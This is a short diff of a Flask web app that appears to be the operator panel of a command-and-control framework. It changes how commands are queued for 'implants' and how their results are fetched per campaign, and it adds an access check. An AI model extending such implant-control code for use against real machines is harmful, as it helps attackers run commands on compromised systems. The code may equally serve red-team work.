@@ -90,11 +90,15 @@ def logout():
 def management():
     return render_template('main.html')
 
-@app.route("/aab", methods =['GET','POST'])
+@app.route("/aab/<cid>", methods =['GET','POST'])
 @login_required
-def cmdreturn():
-    #print( Imp.Get_CommandResult())
-    return str(Imp.Get_CommandResult())
+def cmdreturn(cid):
+    print(request, cid)
+    if db.Verify_UserCanAccessCampaign(current_user.user_email,cid):
+        # print(type())
+        return jsonify(Imp.Get_CommandResult(cid))
+    else:
+        return str(0)
 #Endpoint query
 
 @app.route("/aaa/<cmd>", methods =['GET','POST'])
@@ -274,9 +278,8 @@ def ImplantCommandRegistration(cid):
                 print("ALL:",Implants)
                 # print(request.form['cmd'])
                 Imp.AddCommand(current_user.user_email, Implants ,request.form['cmd'])
-            # -- This is a temp measure, to allow the GLOBAL implant to recieve a command, we will tag commands by
-            # --    implant to ensure they are picked up by the correct infection.
 
+            # This needs to be
             return jsonify({"1":2})
     return "000"
 
